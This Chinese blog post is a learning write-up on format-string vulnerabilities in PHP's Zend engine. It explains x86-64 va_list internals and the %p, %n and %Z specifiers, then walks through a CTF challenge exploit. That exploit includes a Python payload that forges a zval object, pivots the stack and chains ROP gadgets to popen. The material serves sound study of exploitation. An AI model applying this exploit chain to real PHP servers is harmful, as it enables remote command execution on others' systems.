---
title: php pwn学习入门二 (格式化字符串漏洞)
url: 1681.html
id: 1681
categories:
  - 学习记录
date: 2020-5-13 19:57:14
tags:
  - php
  - pwn
  - web
  - 学习记录
---

## php pwn学习入门二 (格式化字符串漏洞)

本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。

<!-- more -->
### 从可变参函数谈起

学习c标准库中类似于`printf`这类函数的格式化字符串漏洞时，我就存在一些疑问：

- 1. 为什么使用多个%p或者%x泄露的是栈上的数据？这是`printf`函数实现上的问题吗，可变参数都存储在什么位置？
- 2. 这存在越界读取数据的行为到底是`printf`函数的问题，还是可变参函数的通病？

为了搞清楚上述的两个问题，需要先搞明白可变参函数的实现原理，首先自己写一个可变参函数，调试一下：

```c
#include <stdarg.h>
#include <stdio.h>

int sum(int n, ...)  //第一个参数表明有可变参数有多少个相加  
{
    va_list ap;
    va_start(ap, n);
    int sum = 0;
    while(n--)
        sum += va_arg(ap, int);
    va_end(ap);
    return sum;
}
int main(){
    printf("%d\n",sum(5,2,3,4,5,6));
    return 0;
}
```

下面对编译器中实现的几个宏进行注释说明：

```c
void va_start( va_list arg_ptr, prev_param ); //初始化pArgs指针，使其指向第一个可变参数。该宏第二个参数是变参列表的前一个参数，即最后一个固定参数
type va_arg( va_list arg_ptr, type );  //该宏返回变参列表中的当前变参值并使pArgs指向列表中的下个变参。该宏第二个参数是要返回的当前变参类型，若函数有多个可变参数，则依次调用va_arg宏获取各个变参

void va_end( va_list arg_ptr ); // 将指针pArgs置为无效，结束变参的获取
```

其中 `va_list`结构体在64位上大概长这个样子:

```c
typedef struct {
   unsigned int gp_offset;
   unsigned int  fp_offset;
   void *  overflow_arg_area ;
   void * reg_save_area; 
} va_list_entry ;

typedef  va_list_entry[0] va_list;
```

对上述的sum函数进行反编译：

![http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png](http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png)

<!-- ![http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png](http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png) -->

当 ` ap[0].gp_offset <= 0x2F`时 ， `v1`的取值是 `ap[0].reg_save_area + ap[0].gp_offset` ,当 `ap[0].gp_offset > 0x2F`时，`v1`的取值是 `v1 = ap[0].overflow_arg_area;`。

为了搞清楚，`va_list_entry`每个字段的含义，需要先来看一下`ap`的初始化过程：

```asm
push    rbp
mov     rbp, rsp
sub     rsp, 0F0h
mov     [rbp+n], edi
mov     [rbp+var_A8], rsi
mov     [rbp+var_A0], rdx
mov     [rbp+var_98], rcx
mov     [rbp+var_90], r8
mov     [rbp+var_88], r9

mov     [rbp+ap.gp_offset], 8
mov     [rbp+ap.fp_offset], 30h ; '0'
lea     rax, [rbp+arg_0]
mov     [rbp+ap.overflow_arg_area], rax
lea     rax, [rbp+var_B0]
mov     [rbp+ap.reg_save_area], rax
```

这里可以看到 `ap.gp_offset`被初始化为8，它表示当前初始化`va_list ap`的函数中固定参数的个数，`ap.gp_offset = 固定参数个数*8`,`ap.fp_offset`这个的含义我还没理解，暂时未知，以后遇到了再加上去。 `ap.overflow_arg_area`保存的是 `rbp+0x10`(因为在32位中，这个位置保存的是函数的第一个参数，所以ida习惯性的重命名为`rbp+arg_0`)。`ap.reg_save_area`保存的是`rbp-0xb0`，它加上`ap.gp_offset`恰好就是函数第一个可变参数`rsi`保存的位置`rbp+var_A8`。

通过上述分析，就明白了64位的可变参函数的工作过程如下：

1. 首先将rsi,rdx, rcx,r8,r9 这五个用于传参的寄存器在当前栈空间中进行备份。
2. 初始化结构体`ap`, `ap.reg_save_area`保存`rsi`在栈上备份位置-8的位置，`ap.overflow_arg_area`保存的是`rbp+0x10`。
3. 在使用可变参数时，前五个在当前函数栈帧中找，后续的参数在自己调用者的函数栈帧中找。

明白了上述的工作过程，就解释了格式化字符串漏洞为啥泄露的是栈上的数据了。由于可变参函数参数个数不确定的特性导致无法合理的控制数据读取的边界，所以即使我们自己编写的可变参函数也可能存在泄露栈数据的问题，就拿上述的`sum`函数来讲，将代码改成如下。

```c++
#include <stdarg.h>
#include <stdio.h>

int sum(int n, ...)  //第一个参数表明有可变参数有多少个相加  
{
    va_list ap;
    va_start(ap, n);
    int sum = 0;
    while(n--)
        sum += va_arg(ap, int);
    va_end(ap);
    return sum;

}

int main(){
    int n; 
    scanf("%d",&n);
    printf("%d\n",sum(n,0,0,0,0,0));
    return 0;
}
```
当输入的n>=6时，就会泄露栈上的信息。


### php中的格式化字符串函数

php中的格式化字符串函数主要有如下四个：

```c++

#define spprintf zend_spprintf
#define strpprintf zend_strpprintf
#define vspprintf zend_vspprintf
#define vstrpprintf zend_vstrpprintf

ZEND_API size_t zend_spprintf(char **message, size_t max_len, const char *format, ...) ;
ZEND_API zend_string *zend_strpprintf(size_t max_len, const char *format, ...) ;
ZEND_API size_t zend_vspprintf(char **pbuf, size_t max_len, const char *format, va_list ap);
ZEND_API zend_string *zend_vstrpprintf(size_t max_len, const char *format, va_list ap) 

```

这四个函数在`format`参数被控制的情况下都会产生相似的漏洞，但是需要注意的是这四个函数中有两个`zend_vspprintf`,`zend_vstrpprintf`是非可变参函数，如果想要调用这个两个函数，就需要在外层封装一个可变参函数，然后在内部调用这两个函数。这点非常重要，因为牵扯到`va_list_entry`的初始化的问题，它初始化位置的不同也就意味着之后泄露的栈信息位置的差异(没有理解这句话的在读一遍第一节)。

这四个函数的`format`解析都是在函数`xbuf_format_converter`中完成的， 下面对这个函数中比较关键的几个标志进行说明：

```c++
// main/spprintf.c

static void xbuf_format_converter(void *xbuf, zend_bool is_char, const char *fmt, va_list ap)
{
    // ......

    case 'p':
        if (sizeof(char *) <= sizeof(u_wide_int)) {
            ui_num = (u_wide_int)((size_t) va_arg(ap, char *));
            s = ap_php_conv_p2(ui_num, 4, 'x',
                    &num_buf[NUM_BUF_SIZE], &s_len);
            if (ui_num != 0) {
                *--s = 'x';
                *--s = '0';
                s_len += 2;
            }
        } else {
            s = "%p";
            s_len = 2;
        }
        pad_char = ' ';
        break;
    
    case 'n':
        *(va_arg(ap, int *)) = is_char? (int)((smart_string *)xbuf)->len : (int)ZSTR_LEN(((smart_str *)xbuf)->s);
        goto skip_output;

    /*
        * Always extract the argument as a "char *" pointer. We
        * should be using "void *" but there are still machines
        * that don't understand it.
        * If the pointer size is equal to the size of an unsigned
        * integer we convert the pointer to a hex number, otherwise
        * we print "%p" to indicate that we don't handle "%p".
        */

    case 'Z': {
        zvp = (zval*) va_arg(ap, zval*); // 把下一个参数作为zval指针类型
        free_zcopy = zend_make_printable_zval(zvp, &zcopy);
        if (free_zcopy) {
            zvp = &zcopy;
        }
        s_len = Z_STRLEN_P(zvp);
        s = Z_STRVAL_P(zvp);
        if (adjust_precision && (size_t)precision < s_len) {
            s_len = precision;
        }
        break;
    }
}

```

`%p`和`%n`的实现跟c语言中的`printf`函数类似，`%p`将`ap`下一个偏移位置的数据强制转为16进制字符串，`%n`是向`ap`下一个偏移位置写入当前需要打印的字符长度。`%Z`是它特有的，将`ap`下一个偏移位置的数据转化为zval指针类型，然后调用`zend_make_printable_zval`将`zval`数据类型转化为字符串，跟进一下`zend_make_printable_zval`函数：

```c++
// Zend/zend.c

ZEND_API int zend_make_printable_zval(zval *expr, zval *expr_copy) /* {{{ */
{
	if (Z_TYPE_P(expr) == IS_STRING) {
		return 0;
	} else {
		ZVAL_STR(expr_copy, _zval_get_string_func(expr));
		return 1;
	}
}

ZEND_API zend_string* ZEND_FASTCALL _zval_get_string_func(zval *op) /* {{{ */
{
try_again:
	switch (Z_TYPE_P(op)) {
		case IS_UNDEF:
		case IS_NULL:
		case IS_FALSE:
			return ZSTR_EMPTY_ALLOC();
		case IS_TRUE:
			return ZSTR_CHAR('1');
		case IS_RESOURCE: {
			char buf[sizeof("Resource id #") + MAX_LENGTH_OF_LONG];
			int len;

			len = snprintf(buf, sizeof(buf), "Resource id #" ZEND_LONG_FMT, (zend_long)Z_RES_HANDLE_P(op));
			return zend_string_init(buf, len, 0);
		}
		case IS_LONG: {
			return zend_long_to_str(Z_LVAL_P(op));
		}
		case IS_DOUBLE: {
			return zend_strpprintf(0, "%.*G", (int) EG(precision), Z_DVAL_P(op));
		}
		case IS_ARRAY:
			zend_error(E_NOTICE, "Array to string conversion");
			return zend_string_init("Array", sizeof("Array")-1, 0);
		case IS_OBJECT: {
			zval tmp;
			if (Z_OBJ_HT_P(op)->cast_object) {
				if (Z_OBJ_HT_P(op)->cast_object(op, &tmp, IS_STRING) == SUCCESS) {
					return Z_STR(tmp);
				}
			} else if (Z_OBJ_HT_P(op)->get) {
				zval *z = Z_OBJ_HT_P(op)->get(op, &tmp);
				if (Z_TYPE_P(z) != IS_OBJECT) {
					zend_string *str = zval_get_string(z);
					zval_ptr_dtor(z);
					return str;
				}
				zval_ptr_dtor(z);
			}
			zend_error(EG(exception) ? E_ERROR : E_RECOVERABLE_ERROR, "Object of class %s could not be converted to string", ZSTR_VAL(Z_OBJCE_P(op)->name));
			return ZSTR_EMPTY_ALLOC();
		}
		case IS_REFERENCE:
			op = Z_REFVAL_P(op);
			goto try_again;
		case IS_STRING:
			return zend_string_copy(Z_STR_P(op));
		EMPTY_SWITCH_DEFAULT_CASE()
	}
	return NULL;
}

```

在函数 `_zval_get_string_func` 中可以看到在php中非常熟悉的转换为字符串的问题，例如数组被转化为`Array`字符串。其中需要关注的是`IS_OBJECT`时的转换，将宏展开是是下面的代码：

```c++
    if ( ((*op).value.obj)->handlers->cast_object ) {
        if (((*op).value.obj)->handlers->cast_object(op, &tmp, IS_STRING) == SUCCESS) {
            return Z_STR(tmp);
        }
    } else if ( ((*op).value.obj)->handlers->get) {
        zval *z = ((*op).value.obj)->handlers->get(op, &tmp);
        if (Z_TYPE_P(z) != IS_OBJECT) {
            zend_string *str = zval_get_string(z);
            zval_ptr_dtor(z);
            return str;
        }
        zval_ptr_dtor(z);
    }
    
```

此时需要补充一下php中的一些关键的结构体定义：

```c++

// Zend/zend_types.h

struct _zval_struct {
	zend_value        value;			/* value */
	union {
		struct {
			ZEND_ENDIAN_LOHI_4(
				zend_uchar    type,			/* active type */
				zend_uchar    type_flags,
				zend_uchar    const_flags,
				zend_uchar    reserved)	    /* call info for EX(This) */
		} v;
		uint32_t type_info;
	} u1;
	union {
		uint32_t     next;                 /* hash collision chain */
		uint32_t     cache_slot;           /* literal cache slot */
		uint32_t     lineno;               /* line number (for ast nodes) */
		uint32_t     num_args;             /* arguments number for EX(This) */
		uint32_t     fe_pos;               /* foreach position */
		uint32_t     fe_iter_idx;          /* foreach iterator index */
		uint32_t     access_flags;         /* class constant access flags */
		uint32_t     property_guard;       /* single property guard */
		uint32_t     extra;                /* not further specified */
	} u2;
};
```
php中的所有变量都存储在`zval`这样的结构体中，它所对应的变量类型由type这个字段标识，它的值是由value确定，它永远是一个指针类型, `type`和`value`的定义如下：

```c++
/* regular data types */
#define IS_UNDEF					0
#define IS_NULL						1
#define IS_FALSE					2
#define IS_TRUE						3
#define IS_LONG						4
#define IS_DOUBLE					5
#define IS_STRING					6
#define IS_ARRAY					7
#define IS_OBJECT					8
#define IS_RESOURCE					9
#define IS_REFERENCE				10

/* constant expressions */
#define IS_CONSTANT					11
#define IS_CONSTANT_AST				12

/* fake types */
#define _IS_BOOL					13
#define IS_CALLABLE					14
#define IS_ITERABLE					19
#define IS_VOID						18

/* internal types */
#define IS_INDIRECT             	15
#define IS_PTR						17
#define _IS_ERROR					20


typedef union _zend_value {
	zend_long         lval;				/* long value */
	double            dval;				/* double value */
	zend_refcounted  *counted;
	zend_string      *str;
	zend_array       *arr;
	zend_object      *obj;
	zend_resource    *res;
	zend_reference   *ref;
	zend_ast_ref     *ast;
	zval             *zv;
	void             *ptr;
	zend_class_entry *ce;
	zend_function    *func;
	struct {
		uint32_t w1;
		uint32_t w2;
	} ww;
} zend_value;
```

php对`value`指针指向的不同类型都进行了定义，例如:

```c++
struct _zend_string {
	zend_refcounted_h gc;
	zend_ulong        h;                /* hash value */
	size_t            len;
	char              val[1];
};

struct _zend_array {
	zend_refcounted_h gc;
	union {
		struct {
			ZEND_ENDIAN_LOHI_4(
				zend_uchar    flags,
				zend_uchar    nApplyCount,
				zend_uchar    nIteratorsCount,
				zend_uchar    consistency)
		} v;
		uint32_t flags;
	} u;
	uint32_t          nTableMask;
	Bucket           *arData;
	uint32_t          nNumUsed;
	uint32_t          nNumOfElements;
	uint32_t          nTableSize;
	uint32_t          nInternalPointer;
	zend_long         nNextFreeElement;
	dtor_func_t       pDestructor;
};

struct _zend_object {
	zend_refcounted_h gc;
	uint32_t          handle; // TODO: may be removed ???
	zend_class_entry *ce;
	const zend_object_handlers *handlers;
	HashTable        *properties;
	zval              properties_table[1];
};

```

`_zend_object`的`handlers`指向一个函数指针数组，存储`_zend_object`相关函数的地址，`zend_object_handlers`的定义如下：

```c++

struct _zend_object_handlers {
	/* offset of real object header (usually zero) */
	int										offset;
	/* general object functions */
	zend_object_free_obj_t					free_obj;
	zend_object_dtor_obj_t					dtor_obj;
	zend_object_clone_obj_t					clone_obj;
	/* individual object functions */
	zend_object_read_property_t				read_property;
	zend_object_write_property_t			write_property;
	zend_object_read_dimension_t			read_dimension;
	zend_object_write_dimension_t			write_dimension;
	zend_object_get_property_ptr_ptr_t		get_property_ptr_ptr;
	zend_object_get_t						get;
	zend_object_set_t						set;
	zend_object_has_property_t				has_property;
	zend_object_unset_property_t			unset_property;
	zend_object_has_dimension_t				has_dimension;
	zend_object_unset_dimension_t			unset_dimension;
	zend_object_get_properties_t			get_properties;
	zend_object_get_method_t				get_method;
	zend_object_call_method_t				call_method;
	zend_object_get_constructor_t			get_constructor;
	zend_object_get_class_name_t			get_class_name;
	zend_object_compare_t					compare_objects;
	zend_object_cast_t						cast_object;
	zend_object_count_elements_t			count_elements;
	zend_object_get_debug_info_t			get_debug_info;
	zend_object_get_closure_t				get_closure;
	zend_object_get_gc_t					get_gc;
	zend_object_do_operation_t				do_operation;
	zend_object_compare_zvals_t				compare;
};
```

通过上述的分析，可以知道在控制格式化字符串的`format`参数之后可以使用`%p`来泄露栈数据，而且至少有两种控制EIP的方法：

1. 利用 `%n`，修改栈上存储的返回地址，然后跳转到指定的位置执行。
2. 利用 `%Z`，在可控的位置伪造一个`object`类型的fake`zval`，然后伪造`object`类型的函数指针数组`handlers`中的`get`或者`cast_object`函数指针为需要执行的指令地址，就可以控制EIP。


由于php一般都运行在web环境中，无法直接交互，所以像直接修改返回地址为 `one_gadget` 的利用方法已经无法使用了，为了实现任意命令执行，仅控制EIP是不够的，而且还需要控制RDI，甚至RSI。控制寄存器的方法一般就是使用ROP chian，但是问题在于64位系统中函数调用时通过寄存器传参，并且zend内部注册的变量(我们的输入)一般都是存储在堆上，这两方面原因导致我们无法控制栈上的数据，所以就无法进行ROP chain，所以唯一可行的方案就是找能够进行栈迁移的 `gadget`，将栈迁移到可以控制的数据区域，接着再进行rop。@wupcoo大佬出的题目十分的经典，本文也是在学习他的题目后写的，下面就他的题目提供的exp进行讲解。

### ogeek check_in writeup 

题目地址[https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string](https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string)，原writeup地址[http://www.wupco.cn/?p=4504](http://www.wupco.cn/?p=4504)。


wupcoo原始的exp先泄露了`libphp.so`的加载基址，然后再libphp.so中找rop，这里泄露`libphp.so`加载基址的方法十分的凑巧，主要是利用`CppClass_render`函数再调用`render_s`函数之前会调用函数 `zend_read_property_ex`。

```c++
ZEND_API zval *zend_read_property_ex(zend_class_entry *scope, zval *object, zend_string *name, zend_bool silent, zval *rv) /* {{{ */
{
	zval property, *value;
	zend_class_entry *old_scope = EG(fake_scope);

	EG(fake_scope) = scope;

	if (!Z_OBJ_HT_P(object)->read_property) {
		zend_error_noreturn(E_CORE_ERROR, "Property %s of class %s cannot be read", ZSTR_VAL(name), ZSTR_VAL(Z_OBJCE_P(object)->name));
	}

	ZVAL_STR(&property, name);
	value = Z_OBJ_HT_P(object)->read_property(object, &property, silent?BP_VAR_IS:BP_VAR_R, NULL, rv);

	EG(fake_scope) = old_scope;
	return value;
}
```
这里 `Z_OBJ_HT_P(object)->read_property` 是一个指向libphp中某个函数的函数指针，是存储在r9中的，没有被清空，所以通过泄露R9就可以获得libphp.so的加载基址，但是这种办法不通用，所以被我删除了。

exp中首先使用 700个 `%p` 泄露栈数据，获取一个自主可控的地址空间作为将来栈迁移的基址heap_addr以及libc.so的基址，有由于RCX的值完全可控，所以可以让RCX指向heap_addr，然后在heap_addr的位置布局object类型的fake zval，通过控制`object.handlers->cast_object`来控制EIP，将EIP劫持到指令`push [rcx]; rcr [rbx+0x51],0x41 ; pop rsp ;ret ;`的位置来进行栈迁移，并同时布局rop chain用于控制RDI和RSI，最后跳转到`popen`进行任意命令执行。栈数据构造的代码以及注释如下：

```python

exp = p64(heap_addr+0x10) # heap_addr; 布局 fake zval, zval.value.obj= heap_addr+0x10 , size0f(zval)  = 0x10        
exp += p64(0x8)           # heap_addr+0x8 ;   zval.type = 0x8
exp += p64(heap_addr+0x20)# heap_addr+0x10 ;  布局 zend_object,   sizeof(zend_object) = 0x38 0x7f9746cd29a8
exp += bytes("AAAAAAAA",encoding="latin-1")  # heap_addr+0x18   
exp += p64(pop_ret)        # heap_addr+0x20       # 
exp += p64(heap_addr+0x30) # heap_addr + 0x28    zend_object.handlers  = heap_addr + 0x30
exp += p64(pop_rdi)        # heap_addr + 0x30    布局 zend_object_handlers: sizeof(zend_object_handlers) = 0xe0 
exp += p64(heap_addr+0xe8) # heap_addr + 0x38    指向command字符串
exp += p64(pop_rsi)        # heap_addr + 0x40    
exp += p64(heap_addr+0xe0) # heap_addr + 0x48    指向字符串"r"
exp += p64(call_popen)     # heap_addr + 0x50    popen函数地址 
exp += bytes("CCCCCCCC"*16,encoding="latin-1")  # heap_addr + 0x58
exp += p64(magic_addr)     # heap_addr + 0xd8    伪造 zend_object_handlers->cast_object 进行栈迁移
exp += bytes("r",encoding="latin-1")+b"\x00"*7 # heap_addr + 0xe0
exp += command.ljust(80,b'\x00') #heap_addr + 0xe8
exp += bytes("AAAAAAAA",encoding="latin-1") 
```

在栈上布局`fake zval`的同时还需要考虑rop chain的布局，这个exp很有意思。

### 参考文献

[http://www.wupco.cn/?p=4504](http://www.wupco.cn/?p=4504)
 
[https://www.freebuf.com/vuls/116398.html](https://www.freebuf.com/vuls/116398.html)

